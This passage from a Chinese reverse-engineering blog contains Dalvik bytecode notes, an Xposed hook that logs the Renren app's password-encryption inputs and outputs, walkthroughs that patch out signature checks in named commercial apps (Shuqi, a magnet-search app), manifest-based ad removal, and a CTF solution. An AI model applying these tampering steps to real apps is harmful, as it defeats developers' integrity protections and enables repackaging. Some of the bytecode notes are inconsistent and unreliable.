字段\n\nLpackage/name/ObjectName;->FieldName:Ljava/lang/String;\n\n**字段格式：类型（包名＋类名）->*字段名称 :*****字段类型**\n\n举例：\n\n```\nDalvik: \n\tLcom/alipay/sdk/app/H5PayActivity;->b:Ljava/lang/String;\nJava:\n    import com.alipay.sdk.app;\n\n    public class H5PayActivity {\n\n        String b;\n\n    }\n```\n\n```\nDalvik:\n\tLcom/auth/third/accountlink/ui/WebViewActivity;->a:Z\nJava:\n\timport com.auth.third.accoutlink.ui;\n\tpublic class WebViewActivity{\n\t\tboolean a;\n\t}\n```\n\n```\nDalvik:\n \tLcom/alipay/sdk/authjs/a;->m:Lorg/json/JSONObject;\nJava:\n\timport com.alipay.sdk.authjs;\n\timport org.json.JSONObject;\n\tpublic class a{\n\t\tJSONObject m;\n\t}\n\n```\n\n例子解析不知道对不对， 如果有表哥看到了欢迎指正\n\n## 1.6 方法\n\n**Lpackage/name/ObjectName;->MethodName (III) Z**\n\n **(III) Z:**这部分表示的是方法的签名信息\n\n举例：\n\n```\nDalvik:\n\tLandroid/app/Activity;-><init>()V\nJava:\n\tpackage andorid.app.Activity;\n\t\n\tpublic class Activity{\n\t\tpublic void <init>(){\n\t\t\n\t\t}\n\t} \n```\n\n```\nDalvik:\n\tLcom/alipay/sdk/j/h;->b()Z\nJava:\n\timport com.alipay.sdk.j;\n\tpublic class h{\n\t\tpublic boolean b(){\n\t\t\n\t\t}\n\t} \n```\n\n```\nDalvik:\n\tLandroid/content/Intent;->getExtras()Landroid/os/Bundle;\nJava:\n\timport andorid.content\n\tpublic class Intent{\n\t\tpublic Bundle getExtras(){\n\t\t\n\t\t}\n\t}\n```\n\n```\nDalvik:\n\tLorg/cocos2dx/lua/LoadingAct;->setContentView(I)V\nJava:\n\timport org.cocos2dx.lua;\n\tpublic class LoadingAct{\n\t\tpublic void setContentView(int p1){\n\t\t\n\t\t}\n\t}\n```\n\n例子解析不知道对不对， 如果有表哥看到了欢迎指正\n\n# 2 Dalvik 指令集\n\n## 2.1 Dalvik 指令格式\n\n推荐一篇文章：[Android 逆向笔记](https://www.zhihu.com/column/c_1115022200100511744)\n\n**基础字节码 - 名称后缀/字节码后缀 目的寄存器** **源寄存**\n\nmove-wide/from16 vAA,vBBBB\n\nmove 为基础字节码，即opcode\n\nwide 为名称后缀，标识指令操作的数据宽度为64位\n\nfrom16 为字节码后缀 ，标识源为一个16位的寄存器引用变量\n\nvAA 为目的寄存器，它始终在源寄存器的前面 一个A代表4位 两个A为8位 取值范围为V0-V(2^8)\n\nvBBBB 为源寄存器， 取值 v0 - v 65535\n\n\n\n## 常见Dalvik 指令的使用\n\n1. 空操作指令\n\n   nop  值为00 通常被用来做代码对齐，无实际操作\n\n2. 数据操作指令\n\n   move 作用：将源寄存器的值赋值给目的寄存器\n\n   move vA,vB ：将vB寄存器的值赋给vA寄存器，源寄存器与目的寄存器都为4位\n\n   move/form16 vAA,vBBBB：将vBBBB寄存器的值赋给vAA寄存器，源寄存器为16位，目的寄存器为8位。\n\n   move-wide vA, vB：为4位的寄存器对赋值。源寄存器与目的寄存器都为4位\n\n   move-object vA, vB：object是对象的意思，出现这个词即为对象。那这里就是为对象赋值。源寄存器与目的寄存器都为4位。\n\n   move-object/from16 vAA, vBBBB：为对象赋值。源寄存器为16位，目的寄存器为8位。\n\n   move-object/16 vAA, vBBBB：为对象赋值。源寄存器与目的寄存器都为16位。\n\n   move-result vAA：将上一个invoke类型指令操作的单字非对象结果赋给vAA寄存器。\n\n   move-result-wide vAA：将上一个invoke类型指令操作的双字非对象结果赋给vAA寄存器。\n\n   move-result-object vAA：将上一个invoke类型指令操作的对象结果赋给vAA寄存器。\n\n   move-exception vAA：保存运行时发生的异常到vAA寄存器。\n\n   move作用：\n\n   1. 赋值操作\n   2. move-result 接收方法返回值操作\n   3. 处理异常的操作\n\n3. 返回指令\n\n   **return**就是返回的意思，大家根据这个英文就可以理解啦。\n\n    \n\n   return-void：表示函数从一个void方法返回，返回值为空。\n\n    return vAA：表示函数返回一个32位**非对象**类型的值，返回值寄存器为8位的寄存器vAA。\n\n    return-wide vAA：表示函数返回一个64位**非对象**类型的值，返回值为8位的寄存器对vAA。\n\n    return-object vAA：这里面出现了object,表示函数返回一个**对象**类型的值。返回值为8位的寄存器vAA。\n\n4. 数据定义指令\n\n   **数据定义指令用来定义程序中用到的常量，字符串，类等数据。**\n\n   \n\n   const/4 vA, #+B：将数值符号扩展为32位后赋给寄存器vA。\n\n   “const/16 vAA, #+BBBB：将数据符号扩展为32位后赋给寄存器vAA。这里的#+BBBB表示 0x12344等\n\n   const vAA, #+BBBBBBBB：将数值赋给寄存器vAA。\n\n   const/high16 vAA, #+BBBB0000“：将数值右边零扩展为32位后赋给寄存器vAA。\n\n   const-wide/16 vAA, #+BBBB：将数值符号扩展为64位后赋给寄存器对vAA。 \n\n   const-wide/32 vAA, #+BBBBBBBB：将数值符号扩展为64位后赋给寄存器vAA。\n\n    const-wide vAA, #+BBBBBBBBBBBBBBBB：将数值赋给寄存器vAA。\n\n    const-wide/high16 vAA, #+BBBB000000000000：将数值右边零扩展为64位后赋给寄存器vAA。\n\n   const-string vAA, string@BBBB：通过字符串索引构造一个字符串并赋给寄存器vAA。\n\n    const-string/jumbo vAA, string@BBBBBBBB：通过字符串索引（较大）构造一个字符串并赋给寄存器vAA。\n\n    const-class vAA, type@BBBB：通过类型索引获取一个类引用并赋给寄存器vAA。\n\n    const-class/jumbo vAAAA, type@BBBBBBBB：通过给定的类型索引获取一个类引用并赋给寄存器vAAAA。\n\n   这条指令占用两个字节，值为0xooff（Android4.0中新增的指令）。\n\n5. 实例操作指令\n\n   “check-cast vAA, type@BBBB”：check-cast v0 ,\n\n   将vAA寄存器中的对象引用转换成指定的类型。如果失败会报出ClassCastException异常。\n\n   如果类型B指定的是基本类型，对于非基本类型的A来说，运行时始终会失败。\n\n    \n\n   “instance-of vA, vB, ”：\n\n   判断vB寄存器中的对象引用是否可以转换成指定的类型。如果可以vA寄存器赋值为1，否则vA寄存器赋值为0。\n\n    \n\n   “new-instance vAA, type@BBBB”：\n\n   构造一个指定类型对象的新实例，并将对象引用赋值给vAA寄存器。类型符type指定的类型不能是数组类。\n\n6. 数组操作指令\n\n   数组操作包括获取数组长度，新建数组，数组赋值，数组元素取值与赋值等操作。\n\n    \n\n   “array-length vA, vB”：\n\n   获取给定vB寄存器中数组的长度并将值赋给vA寄存器。\n\n   数组长度指的是数组的条目个数。\n\n    \n\n   “new-array vA, vB, type@CCCC”：\n\n   构造指定类型（type@CCCC）与大小（vB）的数组，并将值赋给vA寄存器。\n\n    \n\n    “filled-new-array {vC, vD, vE, vF, vG},type@BBBB”： \n\n   构造指定类型（type@BBBB）与大小（vA）的数组并填充数组内容。vA寄存器是隐含使用的，除指定数组的大小外还指定了参数的个数，vC~vG是使用到的参数寄存序列。\n\n    \n\n    “filled-new-array/range {vCCCC ..vNNNN}, type@BBBB”：\n\n   指令功能与“filled-new-array {vC,vD,vE,vF,vG},type@BBBB”相同，只是参数寄存器使用range字节码后缀指定了取值范围 ，vC是第一个参数寄存器，N = A +C -1。\n\n    \n\n   fill-array-data vAA, +BBBBBBBB：\n\n   用指定的数据来填充数组，vAA寄存器为数组引用，引用必须为基础类型的数组，在指令后面会紧跟一个数据表。\n\n7. *异常指令*\n\n   “throw vAA” : 抛出vAA寄存器中指定类型的异常。\n\n8. **跳转指令(重点)**\n\n   跳转指令用于从当前地址跳转到指定的偏移处。\n\n   **Dalvik****指令集中有三种跳转指令**：\n\n   1. goto：无条件跳转\n\n   2. switch：分支跳转\n\n      ​    packed-switch：有规律跳转\n\n      ​\tsparse-switch: 无规律跳转\n\t3.  if：条件跳转    \n\n   ​    if-eq：等于**/**if-ne：不等于\n\n   ​    if-lt：小于**/**if-le：小于等于\n\n   ​    if-gt：大于**/**if-ge：大于等于\n\n   ​    if-eqz：等于0**/**if-nez：不等于0\n\n   ​    if-ltz：小于0**/**if-lez：小于等于0\n\n   ​    if-gtz：大于0**/**if-gez：大于等于0\n\n9. 比较指令(cmp)\n\n    **比较指令用于对两个寄存器的值（浮点型或长整型）进行比较。**\n\n    **大于(1)/等于(0)/小于(-1)=>cmpg、cmp**\n\n    **大于(-1)/等于(0)/小于(1)=>cmpl**\n\n    \n\n    例如：cmp-long vAA, vBB, vCC\n\n   ​    比较两个长整型数。如果vBB寄存器大于vCC寄存器，则结果为1，相等则结果为0，小则结果为-1。\n\n    \n\n    例如：cmpl-float vAA, vBB, vCC\n\n   ​      比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。\n\n    \n\n    例如：cmpl-double vAA, vBB, vCC\n\n   ​    比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。\n\n   \n\n    例如：cmpg-float vAA, vBB, vCC\n\n      比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。\n\n    \n\n   例如：cmpg-double vAA, vBB, vCC\n\n   ​    比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。\n\n10. 字段操作指令\n\n     普通字段 => iget读 / iput 写\n\n     静态字段 => sget读 / sput 写\n\n11. 方法调用指令(重点)\n\n    **根据方法类型不同，共有5条方法调用指令**\n\n    \n\n     invoke-virtual ：调用实例的虚方法\n\n     invoke-super ：调用实例的父类/基类方法\n\n     invoke-direct ：调用实例的直接方法\n\n     invoke-static ：调用实例的静态方法\n\n     invoke-interface ：调用实例的接口方法\n\n12. 数据转换指令\n\n    **数据转换指令用于将一种类型的数值转换成另一种类型。**\n\n    **它的格式为“opcode vA, vB”，vB寄存器存放需要转换的数据，转换后的结果保存在vA寄存器中。**\n\n     \n\n     neg-数据类型 **=>** 求补\n\n     not-数据类型 **=>** 求反\n\n     数据类型1-to-数据类型2 **=>** 将数据类型1转换为数据类型2\n\n13. 数据运算指令\n\n     add/sub/mul/div/rem  加/减/乘/除/模\n\n     and/or/xor 与/或/异或\n\n     shl/shr/ushr  有符号左移/有符号右移/无符号右移\n\n# 参考文献\n\n[深入理解Dalvik字节码指令及Smali文件](https://blog.csdn.net/dd864140130/article/details/52076515)","tags":["逆向"],"categories":["Reverse"]},{"title":"人人登录协议分析","url":"/2020/05/18/逆向/协议/人人协议/","content":"\n# 人人登录协议分析\n\n拿到一个app 首先是要熟悉他的保护，然后在一步一步攻克。\n\n\n\n这次分析的app 没有加壳，所以直接进入分析阶段。\n\n\n\n1. 查看登录流程\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200518115359.png)\n\n   \n\n   可以看到 ajax 请求，在登录前请求了一个加密key，之后有个login请求，请求中密码加密了，还有sig等等，这次就只分析密码加密过程\n\n2. 打开ddms 方法剖析\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200518115623.png)\n\n   查看renren相关的方法， 发现一个特别的方法，追进去查看\n\n3. 打开jadx 搜索具体方法\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200518115757.png)\n\n   图中可以看到有个登录请求，看来方向正确，D函数应该是RSA加密方法，那么确定好后进行hook\n\n4. xposed模块编写\n\n   具体创建之类就不写了，附上代码\n\n   ```\n   public class renren implements IXposedHookLoadPackage {\n       public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable {\n           Log.d(\"xiaomutou\", \"进入hook函数......\");\n   \n   \n           if (lpparam.packageName.equals(\"com.renren.mobile.android\")) {\n               Log.d(\"xiaomutou\", \"app包名：\" + lpparam.packageName);\n   \n               final Class clazz = XposedHelpers.findClass(\"com.renren.mobile.utils.RSA\", lpparam.classLoader);\n   \n               XposedHelpers.findAndHookMethod(clazz,\n                      \"D\",\n                       String.class,\n                       String.class,\n                       String.class,\n                       new XC_MethodHook(){\n   \n                           protected void beforeHookedMethod(MethodHookParam param) throws Throwable {\n                               super.beforeHookedMethod(param);\n   \n                               Log.d(\"xiaomutou\", \"打印hook参数前变量\");\n                               Log.d(\"xiaomutou\", \"第一个参数\"+param.args[0]);\n                               Log.d(\"xiaomutou\", \"第二个参数\"+param.args[1]);\n                               Log.d(\"xiaomutou\", \"第三个参数\"+param.args[2]);\n                           }\n   \n                           protected void afterHookedMethod(MethodHookParam param) throws Throwable {\n                               super.afterHookedMethod(param);\n   \n                               Log.d(\"xiaomutou\", \"返回加密后的pwd\");\n   \n                               param.getResult();\n                               Log.d(\"xiaomutou\",\"返回值\"+param.getResult());\n   \n                           }\n                       }\n               );\n           }\n       }\n   }\n   ```\n\n   在方法执行前打印 调用的参数， 在方法执行后打印密码加密后的值，并输出\n\n5. 结果\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200518120148.png)","tags":["逆向"],"categories":["Reverse"]},{"title":"shuqi小说去除签名校验","url":"/2020/05/02/逆向/破解/xx小说去除签名校验/","content":"\n# 书旗小说去除签名校验\n\n# shuqi小说去除签名校验\n\n## 使用工具\n\nandorid killer 、 jadx 、雷电模拟器\n\n## 去除过程\n\n1. 老规矩，重签名打包 顺便打开ddms 随时关注报错信息\n\n   发现打开了activity 之后就自动关闭了，这里呢就考虑到了入口页面和入口点， apk进行到了入口页面处了，之后才关闭，那就不需要动态调试了，定位到oncreate处\n\n2. 关键字搜索（尝试新方法搜索）\n\n   先换个思路，这里试试关键字搜索，看能找到有用的信息不：方法是逐个加log输出，看看那个调用后就崩溃了\n\n   打开android killer 搜索Signatures，然后逐个加log ，很多明显不是自己的可以忽略\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200502095534676.png)\n\n3. 之后编译 安装，ddms捕获消息\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200502104723497.png)\n\n4. 回到andoridkiller中搜索这个字符串\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200502104737122.png)\n\n5. 看到了签名三兄弟出没，那么这块肯定有签名了，\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200502104944334.png)\n\n6. 这里就很明显了，看到了killprocess，绕过方式： 使得if判断为真，将eq改为ne 成功绕过\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200502105402616.png)\n\n7. 成功绕过签名校验\n\n   \n\n","tags":["破解"],"categories":["Reverse"]},{"title":"霸哥磁力搜索去签名校验","url":"/2020/05/01/逆向/破解/霸哥磁力搜索去签名校验/","content":"\n\n\n## 案例1 霸哥磁力搜索\n\n首先 签名校验不止一个，所以会经历无数次安装， \n\n1. 重签名打包，安装查看是否有签名校验（这里可以通过启动界面返回的信息查看）\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501192911937.png)\n\n   \n\n   安装 如果有检测 进入第二步\n\n   比如 下面的情况\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501193008226.png)\n\n2. 检测是否有加固 \n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501193159772.png)\n\n   有加固进入第三步\n\n   没有加固进入第四步\n\n3. 有加固 ，先脱壳修复\n\n4. 查看处理的地方，干掉存在签名校验的地方\n\n   ok 接下来分析他在哪校验的\n\n   工具的话： andorid killer 、 jadx 、ida、ddms\n\n   \n\n   先看看刚才程序崩溃是什么情况导致的\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501193504305.png)\n\n   使用android killer 加载apk，同时使用jadx 加载，配合查看函数\n\n   根据崩溃原因，判断检测应该是在刚开始打开apk就执行的，所以第一步找到MainActivity.smail\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501193941917.png)\n\n   接下来逐个阅读逻辑，配合jadx 查看方法是否有检测校验，（存在getPackageManager、PackageManager、getPackageInfo称为签名三兄弟，如果出现这三个函数就肯定有签名校验 ）\n\n   发现存在方法\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501194338764.png)\n\n   在qian()方法中找到熟悉的内容 刚刚我提到的签名三兄弟\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501194550120.png)\n\n   绕过方法： 注释\n\n   回到刚才调用的位置 \n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501194636111.png)\n\n   打包签名安装，之后测试（记得 保存）\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501194832345.png)\n\n   发现崩溃在了JNI_onload处  调用了libbug.so 那么猜测这里可能存在so层的校验,找一下是否有这个调用so的操作\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501195203094.png)\n\n   继续往下看的时候发现有个调用bug()的方法，找不到bug方法的函数\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501195231400.png)\n\n   看到这个就知道方法定义在so层，将so文件拖入ida中，先看看jni_onload 发现没有，那么就是静态注册了，\n\n   找找Java下划线开头的方法，只有一个Java_ xxx _bug 那么肯定就是这个了\n\n   大概意思就是在搜索前会获取一个sign值，之后返回结果，跟进getSignHashCode 看看\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501195549371.png)\n\n   这个是getSignHashCode  方法的内容， 看到了三兄弟那就没跑了，这里还存在一个校验。最后会判断一个result的值，然后如果判断成功 也就是result 不等于226776851 就会exit(0) 退出\n\n   \n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501195758064.png)\n\n   绕过方法： 使得判断为假，或者使得exit（0）不执行 将判断改成不等于\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501201706668.png)\n\n   之后保存即可 保存方式：edit->patch program-> apply patches to input file...\t\n\n   ok 修改成功。\t\t\t\t\t\t\t \n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/image-20200501203303590.png)","tags":["破解"],"categories":["Reverse"]},{"title":"去某游戏app广告","url":"/2020/03/31/逆向/破解/去某app广告/","content":"\n\n\n# 去某app广告\n\n刚开始学逆向，难度大的不好掌握，找一些难度较小的先来学习\n\n今天的目标就是去广告\n\n这款app每次开启都会有一个5秒的广告 特别烦人，为了享受游戏带来的乐趣，我要修改某些参数使这个广告消失\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200331155910290.png)\n\n## 环境\n\n手机或者模拟器（用来检验成果）\n\nAndroidKiller\n\nadb\n\n## 正文\n\n首先 这里说明一个命令 `adb shell dumpsys activity top` 获取当前界面的activity\n\n这块圈出来的就是调用app的广告activity\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200331160858079.png)\n\n打开`AndroidKiller`查看当前获取到的activity，定位到`com.mosads.adslib.Splash.MosSplashActivity`处,\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200331161253393.png)\n\n我把这段activity copy出来了，看到在他的activity中包含了Main 和Launcher 两个东东，他表示的时开始界面，那么就清楚了，每次启动都会从这广告界面开始\n\n```\n<activity android:configChanges=\"keyboardHidden|orientation|screenSize\" android:label=\"@string/app_name\" android:name=\"com.mosads.adslib.Splash.MosSplashActivity\" android:screenOrientation=\"landscape\" android:theme=\"@style/AppTheme.NoActionBar\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\"/>\n                <category android:name=\"android.intent.category.LAUNCHER\"/>\n            </intent-filter>\n        </activity>\n```\n\n接下来是我们去广告的重点了，找到程序真正的主界面，\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200331161644990.png)\n\n定位到主界面的activity处\n\n```\n</intent-filter>\n        </activity>\n        <activity android:configChanges=\"keyboardHidden|orientation|screenSize\" android:label=\"@string/app_name\" android:name=\"org.cocos2dx.lua.AppActivity\" android:screenOrientation=\"landscape\" android:theme=\"@android:style/Theme.NoTitleBar.Fullscreen\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\"/>\n                <action android:name=\"MosSplashActivityToTarget\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n            </intent-filter>\n\n```\n\n可以看到只有Main 而没有Launcher 这时候就可以将刚才的Launcher 复制到真正的主界面中，并且删除广告里面的main和Launcher就可以毁掉广告页面，\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200331161959616.png)\n\n\n\n还有一种去广告的方法， 可以通过删除网络权限去广告，这个后面遇到会提出来。\n\n---\n\n今天的去广告就结束了，如果想要尝试的话，可以私我要app\n\n\n\n\n\n","tags":["破解"],"categories":["Reverse"]},{"title":"Android-androideasy","url":"/2020/03/25/CTF/攻防世界/androideasy/","content":"\n\n\n# 题目：androideasy\n\n最近刚学了点逆向技能，找一些简单的ctf 题目来验证一下效果\n\n下载地址：[androideasy](https://github.com/ThunderJie/CTF-Practice/tree/master/CTF-Andorid%20Reverse/androideasy)\n\n## 解题思路\n\n首先拿到的是个zip文件，打开是个普通的apk目录\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200325160159860.png)\n\n也不知道做逆向的和做安全的看到他的感觉是否一样，\n\n修改后缀为`apk` 后扔到jadx中，然后在往模拟器中扔一份\n\n模拟器中可以看到 很简单的功能，输入字符 。点击check 判断是否输入正确\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200325160654280.png)\n\n之后查看jadx\n\n大概确定一下，就是需要输入一个字符串在check判断通过即可\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/2/image-20200325160744208.png)\n\n\n\n定位到check，输入的字符串必须让if判断为真，也就是进入到check的true\n\n```\nprivate byte[] f21s = {113, 123, 118, 112, 108, 94, 99, 72, 38, 68, 72, 87, 89, 72, 36, 118, 100, 78, 72, 87, 121, 83, 101, 39, 62, 94, 62, 38, 107, 115, 106};\n\npublic boolean check() {\n        byte[] chars = this.editText.getText().toString().getBytes();\n        if (chars.length != this.f21s.length) {\n            return false;\n        }\n        int i = 0;\n        while (i < this.f21s.length && i < chars.length) {\n            if (this.f21s[i] != (chars[i] ^ 23)) {\n                return false;\n            }\n            i++;\n        }\n        return true;\n    }\n\n```\n\n接下来写firda 代码\n\n```\nfunction flag() {\n    Java.perform(function () {\n        var flag1 = Java.use(\"com.a.sample.androidtest.MainActivity\");\n        flag1.check.implementation = function () {\n             var retval = this.check();\n             console.log(retval)\n             return true;\n        }\n    })\n}\n\n\nfunction main() {\n    flag()\n}\n\nsetImmediate(main);\n```\n\n这样就可以保证返回为真了\n\n回到正题，前台返回为真对flag没有帮助，\n\n所以还是得得到`f21s` ,写个脚本 获得下面的字符串\n\n`private byte[] f21s = {113, 123, 118, 112, 108, 94, 99, 72, 38, 68, 72, 87, 89, 72, 36, 118, 100, 78, 72, 87, 121, 83, 101, 39, 62, 94, 62, 38, 107, 115, 106};`\n\n最后的脚本\n\n```python\nf21s = [113, 123, 118, 112, 108, 94, 99, 72, 38, 68, 72, 87, 89, 72, 36, 118, 100, 78, 72, 87, 121, 83, 101, 39, 62, 94, 62, 38, 107, 115, 106]\nprint(len(f21s))\nflag = \"\"\n\nfor  i in range(0,len(f21s)):  # 判断每一位，一共判断f21s 长度次\n    for j in range(0,127):\n        if (f21s[i] == (j ^ 23)):\n            flag += chr(j)\n\nprint(flag)py\n```\n\n```\n31\nflag{It_1S_@N_3asY_@nDr0)I)1|d}\n```\n\n","tags":["CTF"],"categories":["Reverse"]},{"title":"Andorid Studio 安装报错 解决","url":"/2020/03/10/逆向/androidstudio安装报错/","content":"\n\n\n# Andorid Studio 安装报错 解决\n\n\n\n## 小记\n\n安装了一下午的AndroidStudio 一直报错，安装不上sdk 实在头疼，查到资料改个hosts就搞定了，舒服\n\n\n\n将这两个写入`c:\\users\\你电脑的名字\\drivers\\etc\\hosts`中 即可解决 不挂代理轻松安装sdk\n\n```\n203.208.43.101 dl-ssl.google.com\n203.208.43.101 dl.google.com\n```\n\n\n\n","tags":["逆向"],"categories":["Reverse"]},{"title":"python第一课 数据结构和算法","url":"/2020/02/27/编程/python/python第一课 数据结构和算法/","content":"\n# python第一课 数据结构和算法\n\n> 注： 本文是对照https://python3-cookbook.readthedocs.io/ 学习 总结笔记 \n\n\n\n## 1.1  解压序列复制给多个变量\n\n**问题**\n\n现在有一个包含 N 个元素的元组或者是序列，怎样将它里面的值解压后同时赋值给 N 个变量？\n\n**解决方案**\n\n**元组**：元组使用小括号与列表非常相似，创建元组只需要 `tup = (1,2,3,4,5,6)`,通过逗隔开即可；查看当前变量是否属于元组可以通过`type(tup)` 来获取变量类型；并且 元组也可以通过 tup = \"a\",\"b\",\"c\" 这样来实现；元组只包含一个元素，需要在元素后面添加逗号，否则会被当做运算符使用。\n\n**序列**：python中的序列一般指 字符串，列表，元组。python在序列中可以进行索引、切片、加、乘、检查成员、确定最大最小元素，\n\n**字符串**： python的字符串我在介绍中也说了， 通过 变量 等于 用引号包括的值即可，例如：\n\nvar = \"St0n5\"\n\n**列表**： 和元组类似，千万不要混淆了， 通过 list = ['ceshi1','ceshi2'] 来创建\n\n\n\n接下来开始解决问题\n\n```\n# 将p赋值给变量，注意变量的数量要和序列的数量相同\n# python 可以通过多变量赋值实现 同时对多个变量的赋值\n>>> p =(4,5)\n>>> x,y=p\n>>> x\n4\n>>> y\n5\n# 接下来 放一个列表试试\n>>> data = ['python','C','中国加油',52.0,(2020,2,26)]\t\t    \n>>> code1,code2,num1,num2,data1=data\t\t    \n>>> code1\t\t    \n'python'\n>>> code2\t\t    \n'C'\n>>> num1\t\t    \n'中国加油'\n>>> num2\t\t\t    \n52.0\n>>> data1\t\t    \n(2020, 2, 26)\n```\n\n**讨论**\n\n上面展示了都是序列元素和元素一样的情况，那如果只需要其中的一部分元素 应该怎么去做，\n\n文章中提供了一种方法是使用任意变量名占位，之后丢掉就好，\n\n还可以通过下标来输入某个元素 也可以达到解压一部分的目的。\n\n## 1.2 解压可迭代对象赋值给多个变量\n\n**问题**\n\n如果一个可迭代对象的元素个数超过变量个数时，会抛出一个 `ValueError` 。 那么怎样才能从这个可迭代对象中解压出 N 个元素出来？\n\n**解决方案**\n\n**容器**: 把多个元素组织在一起的数据结构，当它可以用来询问某个元素是否包含在其中时，就可以理解为这是一个容器\n\n**迭代对象**：很多容器都是可迭代对象，但凡是可以返回一个迭代器的对象都可称之为可迭代对象\n\n**迭代器**： 它是一种带状态的对象，通过`next()`方法调用返回容器的下一个值，迭代器就是工厂模式的对象。\n\n**生成器**： 生成器是一种特殊的迭代器，生成器可以用更少的中间变量些流式代码，此外，相比于其他容器，它能更节省内存和`cpu`，没有返回值，通过`yield`来返回\n\n解决问题\n\n```\n# 解决可迭代对象的元素超过变量个数 ，可以用 * 来解决问题\n>>> record = ('xss','sql','upload','xxe','download')      \n>>> first,*middle,last = record      \n>>> first\t      \n'xss'\n>>> middle      \n['sql', 'upload', 'xxe']\n>>> last      \n'download'\n# middle 永远都是列表类型，元素为空也是如此， 并且 * 表达式 可以用在任何位置。\n```\n\n扩展的迭代语法是为了解压不确定个数或者任意个数的元素的可迭代对象设计的，通常可迭代对象都是有一定规律的， 有时 `*`表达式也可以用来做字符串的分割，\n\n```\n>>> line = 'nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false'\n>>> uname, *fields, homedir, sh = line.split(':')\n>>> uname\n'nobody'\n>>> homedir\n'/var/empty'\n>>> sh\n'/usr/bin/false'\n>>>\n```\n\n当然，如果你想要的解压一些元素并丢弃他们，你可以用`*_`这样来表示废弃\n\n\n\n\n\n未完待续 ...\n\n\n\n\n\n---\n\n参考链接：\n\nhttps://foofish.net/iterators-vs-generators.html\n\nhttps://python3-cookbook.readthedocs.io/zh_CN/latest/c01/p02_unpack_elements_from_iterables.html\n\n","tags":["python"],"categories":["Code"]},{"title":"python 入门简介","url":"/2020/02/26/编程/python/python介绍/","content":"\n# python 简介\n\n\n\n为了完成毕设 努力学习python\n\n\n\n* python 是一种解释型语言\n* pyhton 是交互式语言\n* python是面向对象语言\n* python是初学者语言 很简单\n\n\n\n## 0x01 python区分\n\n只要有python2 和python3 之分\n\n\n\n## 0x02 python的特点\n\n这就不提了 全是优点\n\npython大法好\n\n## 0x03 python 变量类型\n\n### 字符串\n\n一般由数字、字母、下划线组成\n\n```\nstr = 'xxxx'\n```\n\n**方法**\n\n\n\n## 列表\n\n支持字符、数字、字符串 甚至可以包含列表（嵌套）\n\n```\nlist = [ 'runoob', 786 , 2.23, 'john', 70.2 ]\ntinylist = [123, 'john']\n```\n\npython中支持数据类型和类型的`连接`和`重复`操作\n\n## 元组\n\n元组用`()`标识，内部元素用逗号隔开。但是元组不能二次赋值，\n\n元组不能通过修改\n\n```\ntuple = ( 'runoob', 786 , 2.23, 'john', 70.2 )\ntinytuple = (123, 'john')\n```\n\n## 字典\n\n字典也是经常要使用的数据类型之一，和列表相比，列表是有序的对象集合，字典是无需的对象集合，列表是通过偏移存取，而字典是通过键来存取的\n\n```\ndict = {}\ndict['one'] = \"This is one\"\ndict[2] = \"This is two\"\n \ntinydict = {'name': 'john','code':6734, 'dept': 'sales'}\n```\n\n\n\n\n\n# PythonTip \n\n## 每日一练\n\n**结尾为0的个数**\n\n```\n给你一个正整数列表 L, 输出L内所有数字的乘积末尾0的个数。(提示:不要直接相乘,数字很多,相乘得到的结果可能会很大)。例如： L=[2,8,3,50],则输出：2\n```\n\n我拿到题第以想法就是乘，但无疑会增加算法的时间复杂度，所以，接下来就是分析如何更加简洁的利用\n\n需要的是末尾0的个数，而数字中任何可以得到末尾为0的个数的值都可以化为2x5x某个值\n\n所以接下来只要对每一位数字化一下是否可以通过2或者 5 得到\n\n最后求一下2和5分别有多少个，取最小的那个就可以了 